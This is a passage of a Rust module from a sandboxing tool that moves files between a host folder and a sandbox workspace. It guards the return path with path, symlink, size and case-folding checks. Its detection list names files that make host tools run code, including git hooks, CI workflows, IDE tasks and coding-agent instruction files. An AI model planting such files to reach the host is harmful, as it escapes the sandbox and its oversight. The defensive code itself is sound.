//! An env's workspace is a volume seeded from a host folder. This module resolves envs from
//! folders and moves files between host and sandbox without trusting what comes out.

use std::collections::{BTreeMap, BTreeSet, HashMap};
use std::io::{Read, Write};
use std::path::{Component, Path, PathBuf};
use std::process::Stdio;
use std::time::{Duration, Instant};

use anyhow::{Context, Result, bail};
use serde::Serialize;
use sha2::{Digest, Sha256};

use crate::config::{self, EnvFile, Workspace};
use crate::env::{Ctx, UID};
use crate::names;
use crate::paths::Paths;
use crate::runtime::exec;

/// Heavy or machine-specific directories skipped when copying in either direction
/// (`.terraform` holds the host platform's provider binaries; `terraform init` in the env
/// fetches its own).
const COPY_SKIP: &[&str] = &[
    "node_modules",
    "target",
    ".venv",
    "__pycache__",
    ".pytest_cache",
    ".next",
    ".svelte-kit",
    ".gradle",
    ".terraform",
];

/// Cap on a pull (it is buffered so it can be reviewed before anything is written).
const MAX_PULL_BYTES: u64 = 2 << 30;

pub fn expand(p: &str) -> PathBuf {
    match (p.strip_prefix("~/"), directories::BaseDirs::new()) {
        (Some(rest), Some(b)) => b.home_dir().join(rest),
        _ => PathBuf::from(p),
    }
}

pub fn canonical(p: &str) -> Result<PathBuf> {
    let path = expand(p);
    path.canonicalize()
        .with_context(|| format!("{} does not exist", path.display()))
}

/// Whether `p` names a place on another machine, which merely looking it up reaches: a UNC
/// path (`\\server\share`, `//server/share`, `\\?\UNC\…`), to which Windows sends the user's
/// credentials, or `/net/<host>`, which macOS's automounter mounts. `\\?\C:\…` is a local
/// drive in Windows' long form.
pub fn network_path(p: &str) -> bool {
    let sep = |c: u8| c == b'/' || c == b'\\';
    let b = p.as_bytes();
    if b.len() >= 2 && sep(b[0]) && sep(b[1]) {
        let local_drive = b.len() >= 6
            && (b[2] == b'?' || b[2] == b'.')
            && sep(b[3])
            && b[4].is_ascii_alphabetic()
            && b[5] == b':';
        return !local_drive;
    }
    sep(b.first().copied().unwrap_or_default())
        && p[1..]
            .split(['/', '\\'])
            .next()
            .is_some_and(|first| first.eq_ignore_ascii_case("net"))
}

/// A valid env name from a directory or repo name: `My_Project` → `my-project`.
pub fn name_from(s: &str) -> String {
    let base = s
        .trim_end_matches(['/', '\\'])
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(s)
        .trim_end_matches(".git");
    let mut out = String::new();
    for c in base.chars() {
        let c = c.to_ascii_lowercase();
        if c.is_ascii_alphanumeric() {
            out.push(c);
        } else if !out.ends_with('-') && !out.is_empty() {
            out.push('-');
        }
    }
    let out: String = out.trim_matches('-').chars().take(40).collect();
    out.trim_end_matches('-').to_string()
}

/// The env whose folder, or a repo folder of whose, contains `cwd`: the deepest one, and at
/// the same depth an env's own folder over another's repo.
pub fn env_for_dir(paths: &Paths, cwd: &Path) -> Result<Option<String>> {
    let mut best: Option<((usize, bool), String)> = None;
    // Other envs with the same folder, equally close: which one is meant, only `-e` says.
    let mut tied: Vec<String> = Vec::new();
    for name in config::list_envs(paths)? {
        let Ok(f) = EnvFile::load(paths, &name) else {
            continue;
        };
        let ws = &f.cfg.workspace;
        let folders = ws.dir.iter().map(|d| (d, true)).chain(
            ws.repos
                .values()
                .filter_map(|r| r.dir.as_ref())
                .map(|d| (d, false)),
        );
        for (dir, own) in folders {
            let Ok(dir) = canonical(dir) else { continue };
            if cwd.starts_with(&dir) {
                let rank = (dir.components().count(), own);
                match &best {
                    Some((r, n)) if rank == *r && *n != name => tied.push(name.clone()),
                    Some((r, _)) if rank <= *r => {}
                    _ => {
                        best = Some((rank, name.clone()));
                        tied.clear();
                    }
                }
            }
        }
    }
    if let Some((_, first)) = &best
        && !tied.is_empty()
    {
        bail!(
            "envs {} all have this folder; pick one with `-e <env>`",
            std::iter::once(first)
                .chain(&tied)
                .map(|n| format!("`{n}`"))
                .collect::<Vec<_>>()
                .join(", ")
        );
    }
    Ok(best.map(|(_, n)| n))
}

/// Resolve an env argument: a name, or `.`/nothing for the env of the current directory.
pub fn resolve(paths: &Paths, arg: Option<&str>) -> Result<String> {
    match arg {
        Some(n) if n != "." => {
            config::validate_name(n)?;
            Ok(n.to_string())
        }
        _ => {
            let cwd = std::env::current_dir()?.canonicalize()?;
            env_for_dir(paths, &cwd)?.with_context(|| no_env_here(paths, &cwd))
        }
    }
}

/// Why no env acts on `cwd`, naming the envs no folder leads to: those cloned from a remote.
fn no_env_here(paths: &Paths, cwd: &Path) -> String {
    let remote: Vec<String> = config::list_envs(paths)
        .unwrap_or_default()
        .into_iter()
        .filter(|n| {
            EnvFile::load(paths, n)
                .is_ok_and(|f| f.cfg.workspace.dir.is_none() && f.cfg.workspace.url.is_some())
        })
        .collect();
    let mut msg = format!(
        "no env for {} — name one with -e, or create it here with `luoto init`",
        cwd.display()
    );
    if !remote.is_empty() {
        msg.push_str(&format!(
            "; envs cloned from a remote have no folder here, so -e picks them: {}",
            remote.join(", ")
        ));
    }
    msg
}

/// A folder `pull --to` may write: never your home folder or one that holds it.
pub fn check_pull_dest(dest: &Path) -> Result<()> {
    // Each as written and as resolved: a symlinked home, and Windows' `\\?\` form, which
    // only one side may have.
    let forms = |p: &Path| [Some(p.to_path_buf()), p.canonicalize().ok()];
    let homes: Vec<PathBuf> = directories::BaseDirs::new()
        .map(|b| forms(b.home_dir()))
        .into_iter()
        .flatten()
        .flatten()
        .collect();
    let dests: Vec<PathBuf> = forms(dest).into_iter().flatten().collect();
    if homes.iter().any(|h| dests.iter().any(|d| h.starts_with(d))) {
        bail!(
            "{} is your home folder or holds it: pull into a project's own folder",
            dest.display()
        );
    }
    Ok(())
}

/// A path component as macOS (APFS/HFS+) and Windows (NTFS) compare it: case-folded, with
/// the invisible characters HFS+ ignores removed and the trailing dots and spaces NTFS drops.
/// `.GIT`, `.g\u{200c}it` and `.git.` all name `.git` there. Folding goes through upper case
/// first, as the filesystems' tables do: `ſ` (long s) names `s`, `ı` names `i`.
pub(crate) fn fold(component: &str) -> String {
    let s: String = component
        .chars()
        .filter(|c| !crate::text::is_format(*c))
        .flat_map(char::to_uppercase)
        .flat_map(char::to_lowercase)
        .collect();
    s.trim_end_matches(['.', ' ']).to_string()
}

/// An NTFS 8.3 short name (`VSCODE~1`, `ENVRC~2`), which can stand for any long name.
fn short_name(folded: &str) -> bool {
    let stem = folded.split('.').next().unwrap_or("");
    stem.rsplit_once('~').is_some_and(|(head, n)| {
        !head.is_empty() && !n.is_empty() && n.bytes().all(|b| b.is_ascii_digit())
    })
}

/// `rel` with every component folded (see [`fold`]).
fn fold_path(rel: &str) -> String {
    rel.trim_start_matches("./")
        .split('/')
        .map(fold)
        .collect::<Vec<_>>()
        .join("/")
}

/// Whether a component is git's metadata directory under another spelling, including the
/// NTFS 8.3 short name `GIT~1`.
fn disguised_git(component: &str) -> bool {
    let f = fold(component);
    component != ".git" && (f == ".git" || f.starts_with("git~"))
}

/// Paths host tools act on by themselves (opening the folder, entering it, running git, or a
/// build tool's wrapper and config). A sandbox that can write these can run code on the host.
/// Compared folded, so case or invisible characters don't hide them.
pub fn risky(rel: &str) -> Option<&'static str> {
    let rel = fold_path(rel);
    let mut parts = rel.split('/');
    let first = parts.next().unwrap_or("");
    let second = parts.next().unwrap_or("");
    let file = rel.rsplit('/').next().unwrap_or(&rel);
    if first == ".git" || first.starts_with("git~") {
        return Some("git metadata (hooks and config run on the host)");
    }
    if rel.split('/').any(short_name) {
        return Some("a Windows short name, which can stand for a file host tools act on");
    }
    if rel == ".env" || (!rel.contains('/') && rel.starts_with(".env.")) {
        return Some("dotenv file: tools and dev servers started here load it");
    }
    match rel.as_str() {
        ".envrc" => return Some("direnv loads it when you enter the folder"),
        "agents.md" | "claude.md" => {
            return Some("instructions a coding agent on the host follows");
        }
        ".mcp.json" => return Some("MCP servers a coding agent on the host starts"),
        "bunfig.toml" => return Some("bun preloads the scripts it names"),
        ".gitattributes" | ".gitmodules" => return Some("git filters and submodule URLs"),
        ".mise.toml" | "mise.toml" | ".tool-versions" | ".mise.local.toml" | "mise.local.toml"
        | ".config/mise.toml" | "mise/config.toml" => {
            return Some("mise runs hooks and tasks from it");
        }
        ".pre-commit-config.yaml"
        | "lefthook.yml"
        | ".lefthook.yml"
        | "lefthook.yaml"
        | ".lefthook.yaml" => {
            return Some("git hook manager config");
        }
        ".yarnrc.yml" | ".yarnrc" | ".npmrc" | ".pnpmfile.cjs" => {
            return Some("the package manager runs code it names (yarnPath, hooks, scripts)");
        }
        ".cargo/config.toml" | ".cargo/config" => return Some("cargo runners and aliases"),
        "rust-toolchain.toml" | "rust-toolchain" => return Some("rustup toolchain path"),
        "gradlew" | "gradlew.bat" | "mvnw" | "mvnw.cmd" => {
            return Some("build wrapper your IDE runs on import");
        }
        _ => {}
    }
    match (first, second) {
        (".config", "mise") | (".mise", _) => return Some("mise runs hooks and tasks from it"),
        ("gradle", "wrapper") | (".mvn", _) => {
            return Some("build wrapper and extensions your IDE runs on import");
        }
        (".github", "workflows") => {
            return Some("CI runs it with the repository's secrets once pushed");
        }
        _ => {}
    }
    match first {
        ".vscode" => Some("VS Code runs tasks and reads settings from it"),
        ".idea" => Some("JetBrains IDE run configurations"),
        ".husky" => Some("git hooks"),
        ".devcontainer" => Some("dev container definition run by your IDE"),
        ".zed" => Some("Zed tasks and settings"),
        ".claude" | ".cursor" => Some("coding-agent hooks and settings that run on the host"),
        _ if file.ends_with(".code-workspace") => Some("VS Code workspace (tasks, settings)"),
        _ => None,
    }
}

/// [`risky`] for a path in the folder or in any folder it is under: host tools act on a
/// nested project's files when they work there (a repository in the folder, a package of a
/// monorepo).
pub fn risky_nested(rel: &str) -> Option<&'static str> {
    let mut rest = rel;
    loop {
        if let Some(why) = risky(rest) {
            return Some(why);
        }
        rest = rest.split_once('/')?.1;
    }
}

/// Prints each file named in its arguments (relative to the workspace) as its length and that
/// many bytes, at most `$0`, or `-` when it is not a regular file. Never through a symlink: a
/// repository can commit one to `/dev/zero`, a FIFO or a file of the dev user's.
const READ_FILES: &str = r#"cd /workspace || exit 1
for f; do
  if [ -f "$f" ] && [ ! -L "$f" ]; then
    printf '%s\n' "$(head -c "$0" -- "$f" | wc -c)"
    head -c "$0" -- "$f"
  else
    printf -- '-\n'
  fi
done"#;

/// What [`read_files`] does with a file larger than its cap.
#[derive(Clone, Copy, PartialEq, Eq)]
pub enum Oversize {
    /// Fail: the caller needs the whole text.
    Refuse,
    /// Keep the first `cap` bytes.
    Truncate,
}

/// Regular files of the env's workspace by relative path, read as the dev user in one call,
/// each at most `cap` bytes. Missing and other files are left out.
pub fn read_files(
    ctx: &Ctx,
    env: &str,
    rels: &[String],
    cap: usize,
    oversize: Oversize,
) -> Result<HashMap<String, Vec<u8>>> {
    if rels.is_empty() {
        return Ok(HashMap::new());
    }
    let limit = match oversize {
        Oversize::Refuse => cap + 1,
        Oversize::Truncate => cap,
    };
    let limit_arg = limit.to_string();
    let dev = names::dev(env);
    let mut args = exec(&dev)
        .user(UID)
        .argv(["sh", "-c", READ_FILES, &limit_arg]);
    args.extend(rels.iter().cloned());
    let out = ctx
        .rt
        .command()
        .args(&args)
        .output()
        .context("read the workspace's files in the env")?;
    if !out.status.success() {
        bail!(
            "reading the workspace's files failed: {}",
            crate::text::display(String::from_utf8_lossy(&out.stderr).trim())
        );
    }
    let files = framed(rels, &out.stdout, limit);
    if let Some((rel, _)) = files.iter().find(|(_, b)| b.len() > cap) {
        bail!("{} is larger than {cap} bytes", crate::text::display(rel));
    }
    Ok(files)
}

/// Output framed as [`READ_FILES`] frames it (a length line, then that many bytes, or `-`),
/// by `names` in order, each at most `limit` bytes. Stops at anything else.
pub fn framed<S: AsRef<str>>(
    names: &[S],
    mut out: &[u8],
    limit: usize,
) -> HashMap<String, Vec<u8>> {
    let mut found = HashMap::new();
    for name in names {
        let Some(nl) = out.iter().position(|b| *b == b'\n') else {
            break;
        };
        let head = String::from_utf8_lossy(&out[..nl]).trim().to_string();
        out = &out[nl + 1..];
        if head == "-" {
            continue;
        }
        let Ok(n) = head.parse::<usize>() else { break };
        if n > out.len() || n > limit {
            break;
        }
        found.insert(name.as_ref().to_string(), out[..n].to_vec());
        out = &out[n..];
    }
    found
}

fn skip(rel: &Path) -> bool {
    rel.components()
        .any(|c| COPY_SKIP.contains(&c.as_os_str().to_string_lossy().as_ref()))
}

/// What a copy into the env takes from `src`, as relative paths with `true` for a folder, each
/// folder before what it holds. From a git repository that is the files git doesn't ignore
/// and the repository itself (`.git`), so ignored secrets (`.env`, `*.tfvars`, state files)
/// and build output stay out; from any other folder it is everything, with the repositories
/// inside read the same way. `COPY_SKIP` never goes.
pub fn copy_list(src: &Path) -> Result<Vec<(PathBuf, bool)>> {
    let mut out = Vec::new();
    let mut seen = std::collections::HashSet::new();
    collect(src, Path::new(""), &mut out, &mut seen)?;
    Ok(out)
}

fn add(
    out: &mut Vec<(PathBuf, bool)>,
    seen: &mut std::collections::HashSet<PathBuf>,
    rel: PathBuf,
    dir: bool,
) {
    let mut parents: Vec<&Path> = rel
        .ancestors()
        .skip(1)
        .filter(|a| !a.as_os_str().is_empty())
        .collect();
    parents.reverse();
    for p in parents {
        if seen.insert(p.to_path_buf()) {
            out.push((p.to_path_buf(), true));
        }
    }
    // A file git lists twice (an unmerged one, once per stage) goes in once.
    if seen.insert(rel.clone()) {
        out.push((rel, dir));
    }
}

/// `rel` under `src`: through git when it is a work tree, else walked.
fn collect(
    src: &Path,
    rel: &Path,
    out: &mut Vec<(PathBuf, bool)>,
    seen: &mut std::collections::HashSet<PathBuf>,
) -> Result<()> {
    let dir = src.join(rel);
    // Only a repository's own root: a folder inside a bigger work tree (a home folder kept in
    // git with `*` ignored, say) would otherwise copy nothing.
    let files = dir
        .join(".git")
        .exists()
        .then(|| crate::detect::git_files(&dir))
        .flatten();
    let Some(files) = files else {
        if dir.join(".git").exists() {
            crate::progress::warn(&format!(
                "git can't list {}; copying all of it, ignored files included",
                dir.display()
            ));
        }
        return walk(src, rel, false, out, seen);
    };
    // Whether each folder above a listed path is a real one: git lists what its index holds,
    // and a folder since replaced by a symlink would lead the copy out of `src`.
    let mut linked: HashMap<PathBuf, bool> = HashMap::new();
    for f in files {
        let r = rel.join(f.trim_end_matches('/'));
        if skip(&r) {
            continue;
        }
        let through_link = r
            .ancestors()
            .skip(1)
            .filter(|a| !a.as_os_str().is_empty())
            .any(|a| {
                *linked.entry(a.to_path_buf()).or_insert_with(|| {
                    std::fs::symlink_metadata(src.join(a)).is_ok_and(|m| m.is_symlink())
                })
            });
        if through_link {
            continue;
        }
        let Ok(meta) = std::fs::symlink_metadata(src.join(&r)) else {
            // Tracked, but deleted in the work tree.
            continue;
        };
        if meta.is_dir() {
            // A repository git doesn't descend into: one inside this one, or a submodule.
            if src.join(&r).join(".git").exists() {
                collect(src, &r, out, seen)?;
            }
        } else if meta.is_file() || meta.is_symlink() {
            add(out, seen, r, false);
        }
    }
    let git = rel.join(".git");
    match std::fs::symlink_metadata(src.join(&git)) {
        Ok(m) if m.is_dir() => {
            add(out, seen, git.clone(), true);
            walk(src, &git, true, out, seen)?;
        }
        Ok(_) => add(out, seen, git, false),
        Err(_) => {}
    }
    Ok(())
}

/// Everything in `rel`, but a repository inside through [`collect`] (unless `plain`).
fn walk(
    src: &Path,
    rel: &Path,
    plain: bool,
    out: &mut Vec<(PathBuf, bool)>,
    seen: &mut std::collections::HashSet<PathBuf>,
) -> Result<()> {
    let path = src.join(rel);
    for entry in std::fs::read_dir(&path).with_context(|| format!("read {}", path.display()))? {
        let entry = entry?;
        let r = rel.join(entry.file_name());
        if skip(&r) {
            continue;
        }
        let ft = entry.file_type()?;
        if ft.is_dir() {
            if !plain && entry.path().join(".git").exists() {
                collect(src, &r, out, seen)?;
            } else {
                add(out, seen, r.clone(), true);
                walk(src, &r, plain, out, seen)?;
            }
        } else if ft.is_file() || ft.is_symlink() {
            add(out, seen, r, false);
        }
    }
    Ok(())
}

/// Copy a host directory into the env's workspace, or into its folder `sub` (a repo's name),
/// created if needed (host → sandbox is the trusted direction): what [`copy_list`] takes.
pub fn push(ctx: &Ctx, env: &str, src: &Path, sub: Option<&str>) -> Result<usize> {
    let list = copy_list(src)?;
    let dev = names::dev(env);
    let e = exec(&dev).stdin().user(UID);
    let args = match sub {
        None => e.argv(["tar", "-x", "-f", "-", "-C", "/workspace"]),
        // Into a hidden folder first, moved into place only once the whole archive is in, so
        // a copy cut short leaves no half-filled repo for the next `up` to take as done.
        Some(name) => e.argv([
            "sh",
            "-c",
            r#"t="/workspace/.$0.luoto-copy"; rm -rf "$t" && mkdir "$t" && tar -x -f - -C "$t" && mv "$t" "/workspace/$0""#,
            name,
        ]),
    };
    let mut child = ctx
        .rt
        .command()
        .args(&args)
        .stdin(Stdio::piped())
        .stdout(Stdio::null())
        .stderr(Stdio::piped())
        .spawn()
        .context("start tar in the env")?;
    let stdin = child.stdin.take().context("stdin")?;
    let sent = (|| -> Result<usize> {
        let mut builder = tar::Builder::new(stdin);
        builder.follow_symlinks(false);
        let mut count = 0;
        for (rel, dir) in &list {
            let path = src.join(rel);
            if *dir {
                builder.append_dir(rel, &path)?;
            } else {
                builder
                    .append_path_with_name(&path, rel)
                    .with_context(|| format!("read {}", path.display()))?;
                count += 1;
            }
        }
        builder.into_inner()?.flush()?;
        Ok(count)
    })();
    let count = match sent {
        Ok(n) => n,
        Err(e) => {
            // An archive cut short must not be taken as whole: the copy stops here.
            let _ = child.kill();
            let _ = child.wait();
            return Err(e);
        }
    };
    let out = child.wait_with_output()?;
    if !out.status.success() {
        bail!(
            "copying into the env failed: {}",
            String::from_utf8_lossy(&out.stderr).trim()
        );
    }
    Ok(count)
}

#[derive(Debug, Clone, Serialize)]
pub struct PlanEntry {
    pub path: String,
    /// `new` or `changed`.
    pub change: String,
    pub size: u64,
    pub executable: bool,
    pub risky: Option<String>,
}

#[derive(Debug, Clone, Serialize)]
pub struct PullPlan {
    pub dir: String,
    /// The repo it pulls, or `None` for the workspace.
    pub repo: Option<String>,
    pub entries: Vec<PlanEntry>,
    pub unchanged: usize,
    /// Entries refused outright (unsafe paths, links leaving the folder, special files).
    pub refused: Vec<(String, String)>,
    /// What tar said when reading the env's files failed: some may be missing from the plan.
    pub unread: Option<String>,
    /// Hash over what would be written; applying re-checks it so a sandbox can't swap files
    /// between your review and the write.
    pub digest: String,
    #[serde(skip)]
    pub(crate) data: BTreeMap<String, Content>,
}

#[derive(Debug, Clone)]
pub(crate) enum Content {
    File { bytes: Vec<u8>, executable: bool },
    Link(PathBuf),
}

/// A relative path made only of normal components.
fn safe_rel(p: &Path) -> Option<PathBuf> {
    let mut out = PathBuf::new();
    for c in p.components() {
        match c {
            // A backslash is a separator on Windows and becomes `/` in the plan; a colon is a
            // drive or a data stream there. Neither is one plain name.
            Component::Normal(n)
                if n.to_str()
                    .is_some_and(|s| !s.contains('\\') && !(cfg!(windows) && s.contains(':'))) =>
            {
                out.push(n)
            }
            Component::CurDir => {}
            _ => return None,
        }
    }
    (!out.as_os_str().is_empty()).then_some(out)
}

/// Does a link at `rel` pointing to `target` stay inside the folder?
fn link_stays_inside(rel: &Path, target: &Path) -> bool {
    if target.is_absolute() || target.to_string_lossy().contains('\\') {
        return false;
    }
    let mut depth: i64 = rel.components().count() as i64 - 1;
    for c in target.components() {
        match c {
            Component::ParentDir => depth -= 1,
            Component::Normal(_) => depth += 1,
            Component::CurDir => {}
            _ => return false,
        }
        if depth < 0 {
            return false;
        }
    }
    true
}

/// A folder of the env that `pull` writes back to the host.
#[derive(Debug, Clone, PartialEq)]
pub struct PullTarget {
    /// The repo (`/workspace/<name>`), or `None` for the whole workspace.
    pub repo: Option<String>,
    pub dest: PathBuf,
    /// Repos left out of the workspace's pull: each is a target of its own, if any.
    pub skip: Vec<String>,
}

/// Where `pull` writes: the workspace to the env's folder, less its repos, and each repo
/// copied in from a host folder back to that folder; a cloned repo's work leaves by git push.
/// With `to`, all of it goes there instead, each repo at `<to>/<name>`. With `repo`, only that
/// one, to its host folder or else the same name in the env's folder (or `to`). `present` are
/// the repos in the workspace: a folder repo not copied in yet has nothing to pull, and one
/// whose host folder is gone is left out with a warning.
pub fn pull_targets(
    ws: &Workspace,
    to: Option<PathBuf>,
    repo: Option<&str>,
    present: &BTreeSet<String>,
) -> Result<Vec<PullTarget>> {
    // Every folder a pull writes: a config from elsewhere (`luoto import`) names them too.
    let checked = |d: PathBuf| -> Result<PathBuf> {
        check_pull_dest(&d)?;
        Ok(d)
    };
    let to = to.map(checked).transpose()?;
    let root = || -> Result<PathBuf> {
        checked(canonical(ws.dir.as_deref().context(
            "the env has no folder to pull into (`luoto pull --to <dir>` picks one)",
        )?)?)
    };
    if let Some(name) = repo {
        let r = ws.repos.get(name).with_context(|| {
            format!(
                "the env has no repo `{}` (`luoto repo list`)",
                crate::text::display(name)
            )
        })?;
        let dest = match (to, &r.dir) {
            (Some(t), _) => t,
            (None, Some(d)) => checked(canonical(d)?)?,
            (None, None) => {
                let d = root()?.join(name);
                std::fs::create_dir_all(&d)?;
                d
            }
        };
        return Ok(vec![PullTarget {
            repo: Some(name.to_string()),
            dest,
            skip: Vec::new(),
        }]);
    }
    // A workspace of repos has nothing of its own to bring back: /workspace only holds them.
    let mut out = Vec::new();
    if ws.dir.is_some() || ws.url.is_some() {
        out.push(PullTarget {
            repo: None,
            dest: match &to {
                Some(t) => t.clone(),
                None => root()?,
            },
            skip: ws
                .repos
                .keys()
                .filter(|n| present.contains(*n))
                .cloned()
                .collect(),
        });
    }
    let own = ws
        .repos
        .iter()
        .filter_map(|(n, r)| Some((n, r.dir.as_ref()?)))
        .filter(|(n, _)| present.contains(*n));
    for (name, dir) in own {
        let dest = match &to {
            Some(t) => {
                let d = t.join(name);
                std::fs::create_dir_all(&d)?;
                d
            }
            None => match canonical(dir) {
                Ok(d) => checked(d)?,
                Err(e) => {
                    crate::progress::warn(&format!("repo {name} left out: {e:#}"));
                    continue;
                }
            },
        };
        out.push(PullTarget {
            repo: Some(name.clone()),
            dest,
            skip: Vec::new(),
        });
    }
    Ok(out)
}

pub fn plan_pull(ctx: &Ctx, env: &str, target: &PullTarget, include_git: bool) -> Result<PullPlan> {
    let src = match &target.repo {
        Some(name) => format!("/workspace/{name}"),
        None => "/workspace".to_string(),
    };
    let mut args = exec(&names::dev(env))
        .user(UID)
        .argv(["tar", "-c", "-f", "-"]);
    for d in COPY_SKIP {
        args.push(format!("--exclude={d}"));
    }
    if !include_git {
        args.push("--exclude=.git".into());
    }
    for name in &target.skip {
        args.push(format!("--exclude=./{name}"));
    }
    args.extend(["-C".into(), src.clone(), ".".into()]);
    let child = ctx
        .rt
        .command()
        .args(&args)
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .context("start tar in the env")?;
    let read = read_tar(child, MAX_PULL_BYTES, None).map_err(|e| match e {
        TarError::TooLarge => {
            anyhow::anyhow!(
                "{src} is larger than 2 GiB; pull a narrower set or push to a git remote"
            )
        }
        e => anyhow::anyhow!("reading {src} in the env failed: {e}"),
    })?;
    let mut plan = build_plan(&read, &target.dest, &target.skip)
        .with_context(|| format!("reading {src} in the env"))?;
    plan.repo = target.repo.clone();
    Ok(plan)
}

/// What a tar of the env's files gave.
pub(crate) struct TarRead {
    pub raw: Vec<u8>,
    /// What tar said when it failed: the archive is then what it wrote before it did, and
    /// files may be missing from it.
    pub failed: Option<String>,
}

/// Why a tar of the env's files gave nothing to use.
#[derive(Debug)]
pub(crate) enum TarError {
    /// More than the cap.
    TooLarge,
    /// No end within the limit.
    Late(Duration),
    Io(std::io::Error),
}

impl std::fmt::Display for TarError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            TarError::TooLarge => write!(f, "it is larger than the most a pull reads"),
            TarError::Late(d) => write!(f, "no end within {} s", d.as_secs()),
            TarError::Io(e) => write!(f, "{e}"),
        }
    }
}

/// The most of tar's own messages kept.
const MAX_TAR_STDERR: u64 = 16 << 10;

/// Read what `child` (a tar of the env's files) writes: at most `cap` bytes, within `limit`.
/// The sandbox wrote the files and, in a running env, the tar: how much comes and for how
/// long is its choice, so both are bounded, and the child is killed past either.
pub(crate) fn read_tar(
    mut child: std::process::Child,
    cap: u64,
    limit: Option<Duration>,
) -> std::result::Result<TarRead, TarError> {
    let (Some(out), Some(err)) = (child.stdout.take(), child.stderr.take()) else {
        return Err(TarError::Io(std::io::Error::other("no output to read")));
    };
    let over = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false));
    let past = over.clone();
    let reader = std::thread::spawn(move || {
        let mut raw = Vec::new();
        let read = out.take(cap + 1).read_to_end(&mut raw);
        if raw.len() as u64 > cap {
            past.store(true, std::sync::atomic::Ordering::SeqCst);
        }
        read.map(|_| raw)
    });
    let errs = std::thread::spawn(move || {
        let mut kept = Vec::new();
        let mut err = err;
        let _ = (&mut err).take(MAX_TAR_STDERR).read_to_end(&mut kept);
        // The rest is read and dropped, so tar never blocks on it.
        let _ = std::io::copy(&mut err, &mut std::io::sink());
        String::from_utf8_lossy(&kept).trim().to_string()
    });
    let started = Instant::now();
    let status = loop {
        match child.try_wait() {
            Ok(Some(s)) => break s,
            Ok(None) => {}
            Err(e) => return Err(TarError::Io(e)),
        }
        let late = limit.filter(|l| started.elapsed() >= *l);
        // Past the cap the reader has closed its end; a tar that goes on regardless is ended.
        let over = over.load(std::sync::atomic::Ordering::SeqCst);
        if late.is_some() || over {
            let _ = child.kill();
            let _ = child.wait();
            return Err(match late {
                Some(l) => TarError::Late(l),
                None => TarError::TooLarge,
            });
        }
        std::thread::sleep(Duration::from_millis(20));
    };
    let raw = match reader.join() {
        Ok(Ok(raw)) => raw,
        Ok(Err(e)) => return Err(TarError::Io(e)),
        Err(_) => return Err(TarError::Io(std::io::Error::other("reading failed"))),
    };
    if raw.len() as u64 > cap {
        return Err(TarError::TooLarge);
    }
    let said = errs.join().unwrap_or_default();
    let failed = (!status.success()).then(|| {
        if said.is_empty() {
            format!("tar ended with {status}")
        } else {
            crate::text::lines(&said)
        }
    });
    Ok(TarRead { raw, failed })
}

/// The plan for a tar of the env's files, less the top-level folders in `skip` (left out in
/// the env too, where its tar can). A tar that failed is read as far as it goes, and the plan
/// says so (`unread`).
fn build_plan(read: &TarRead, dest: &Path, skip: &[String]) -> Result<PullPlan> {
    let mut archive = tar::Archive::new(read.raw.as_slice());
    let mut entries = Vec::new();
    let mut refused = Vec::new();
    let mut data = BTreeMap::new();
    let mut unchanged = 0;
    let mut hasher = Sha256::new();
    // Folded paths already in the plan: on a case-insensitive host two of them are one file.
    let mut seen = std::collections::HashSet::new();
    let listed = match archive.entries() {
        Ok(l) => Some(l),
        Err(_) if read.failed.is_some() => None,
        Err(e) => return Err(e.into()),
    };
    for e in listed.into_iter().flatten() {
        let mut e = match e {
            Ok(e) => e,
            // Cut short where tar failed.
            Err(_) if read.failed.is_some() => break,
            Err(e) => return Err(e.into()),
        };
        let raw_path = e.path()?.to_path_buf();
        let shown = raw_path
            .to_string_lossy()
            .trim_start_matches("./")
            .to_string();
        let kind = e.header().entry_type();
        if kind.is_dir() {
            continue;
        }
        let Some(rel) = safe_rel(&raw_path) else {
            refused.push((shown, "unsafe path".into()));
            continue;
        };
        let rel_s = rel.to_string_lossy().replace('\\', "/");
        let top = rel_s.split('/').next().unwrap_or_default();
        if skip.iter().any(|n| fold(n) == fold(top)) {
            continue;
        }
        if rel_s.split('/').any(disguised_git) {
            refused.push((rel_s, "names .git under another spelling".into()));
            continue;
        }
        if !seen.insert(fold_path(&rel_s)) {
            refused.push((
                rel_s,
                "differs from another file only by case or invisible characters".into(),
            ));
            continue;
        }
        let host = dest.join(&rel);
        let content = if kind.is_file() {
            let mut bytes = Vec::new();
            let whole = e.read_to_end(&mut bytes).is_ok() && bytes.len() as u64 == e.size();
            if !whole {
                // Cut short where tar failed: the file is not whole.
                if read.failed.is_some() {
                    break;
                }
                bail!("the archive ends inside {}", crate::text::display(&rel_s));
            }
            let executable = e.header().mode().unwrap_or(0) & 0o111 != 0;
            Content::File { bytes, executable }
        } else if kind.is_symlink() {
            let Some(target) = e.link_name()?.map(|t| t.to_path_buf()) else {
                continue;
            };
            if !link_stays_inside(&rel, &target) {
                refused.push((
                    rel_s,
                    format!("symlink to {} leaves the folder", target.display()),
                ));
                continue;
            }
            Content::Link(target)
        } else {
            refused.push((rel_s, "special file".into()));
            continue;
        };
        let (same, size, executable) = match &content {
            Content::File { bytes, executable } => (
                std::fs::symlink_metadata(&host).is_ok_and(|m| m.is_file())
                    && std::fs::read(&host).is_ok_and(|h| &h == bytes),
                bytes.len() as u64,
                *executable,
            ),
            Content::Link(t) => (std::fs::read_link(&host).is_ok_and(|h| &h == t), 0, false),
        };
        if same {
            unchanged += 1;
            continue;
        }
        let change = if host.symlink_metadata().is_ok() {
            "changed"
        } else {
            "new"
        };
        hasher.update(rel_s.as_bytes());
        match &content {
            Content::File { bytes, executable } => {
                hasher.update(Sha256::digest(bytes));
                hasher.update([u8::from(*executable)]);
            }
            Content::Link(t) => hasher.update(t.to_string_lossy().as_bytes()),
        }
        let newly_exec = executable && !std::fs::metadata(&host).is_ok_and(|m| is_executable(&m));
        let risky = risky_nested(&rel_s)
            .map(str::to_string)
            .or_else(|| newly_exec.then(|| "becomes executable".to_string()))
            .or_else(|| matches!(content, Content::Link(_)).then(|| "symlink".to_string()));
        entries.push(PlanEntry {
            path: rel_s.clone(),
            change: change.into(),
            size,
            executable,
            risky,
        });
        data.insert(rel_s, content);
    }
    Ok(PullPlan {
        dir: dest.display().to_string(),
        repo: None,
        entries,
        unchanged,
        refused,
        unread: read.failed.clone(),
        digest: hex::encode(&hasher.finalize()[..16]),
        data,
    })
}

#[cfg(unix)]
